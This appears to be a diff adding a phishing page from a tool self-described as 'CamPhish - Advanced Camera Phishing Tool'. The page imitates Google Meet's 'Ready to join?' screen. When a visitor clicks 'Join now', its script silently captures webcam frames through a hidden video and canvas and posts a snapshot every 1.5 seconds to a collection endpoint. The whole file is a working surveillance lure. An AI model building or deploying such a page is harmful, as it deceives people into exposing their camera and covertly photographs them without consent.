@@ -1,0 +1,267 @@
+<!--
+ * CamPhish - Advanced Camera Phishing Tool
+ * 
+ * Author: Rahul Kushwaha
+ * GitHub: https://github.com/raahulllkushwaha
+ * Repository: https://github.com/raahulllkushwaha/Cam-Phisher
+ * License: GNU General Public License v3.0
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #202124;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .meet-container {
+            text-align: center;
+        }
+
+        .meet-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .meet-logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #00832d, #34a853);
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .meet-logo-text {
+            color: white;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .card {
+            background: #292a2d;
+            border-radius: 16px;
+            padding: 48px 40px;
+            max-width: 480px;
+            width: 90%;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #e8eaed;
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 24px;
+        }
+
+        .meeting-code-box {
+            background: #202124;
+            border: 1px solid #5f6368;
+            border-radius: 8px;
+            padding: 16px 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .meeting-code {
+            color: #8ab4f8;
+            font-size: 16px;
+            font-family: monospace;
+        }
+
+        .lock-icon {
+            color: #5f6368;
+            font-size: 16px;
+        }
+
+        .meeting-info {
+            color: #9aa0a6;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
+        .join-btn {
+            background: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 14px 48px;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+
+        .join-btn:hover {
+            background: #aecbfa;
+            box-shadow: 0 4px 12px rgba(138, 180, 248, 0.3);
+        }
+
+        .other-options {
+            margin-top: 24px;
+            color: #8ab4f8;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .other-options:hover {
+            text-decoration: underline;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .preview-box {
+            background: #3c4043;
+            border-radius: 12px;
+            width: 200px;
+            height: 150px;
+            margin: 0 auto 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #e8eaed;
+            font-size: 48px;
+        }
+
+        .controls {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+
+        .control-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+        }
+
+        .mic-btn {
+            background: #ea4335;
+            color: white;
+        }
+
+        .cam-btn {
+            background: #ea4335;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden webcam capture elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="meet-container">
+        <div class="meet-logo">
+            <div class="meet-logo-icon">📹</div>
+            <span class="meet-logo-text">Google Meet</span>
+        </div>
+
+        <div class="card">
+            <h1>Ready to join?</h1>
+            
+            <div class="preview-box">👤</div>
+            
+            <div class="controls">
+                <button class="control-btn mic-btn">🎤</button>
+                <button class="control-btn cam-btn">📷</button>
+            </div>
+
+            <div class="meeting-code-box">
+                <span class="lock-icon">🔒</span>
+                <span class="meeting-code">meet-xyz-abc-123</span>
+            </div>
+
+            <p class="meeting-info">No one else is here</p>
+
+            <button class="join-btn" onclick="joinMeeting()">Join now</button>
+
+            <p class="other-options">Present</p>
+        </div>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {},
+                error: function() {}
+            });
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        async function joinMeeting() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.log('Camera access denied');
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
